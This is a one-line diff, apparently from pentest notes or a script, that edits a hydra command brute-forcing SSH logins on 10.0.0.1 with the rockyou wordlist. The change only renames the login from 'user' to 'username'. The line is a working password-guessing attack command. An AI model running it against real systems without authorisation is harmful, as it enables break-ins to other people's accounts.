@@ -1,1 +1,1 @@
-hydra -l user -P /usr/share/wordlists/rockyou.txt -s 22 ssh://10.0.0.1
+hydra -l username -P /usr/share/wordlists/rockyou.txt -s 22 ssh://10.0.0.1
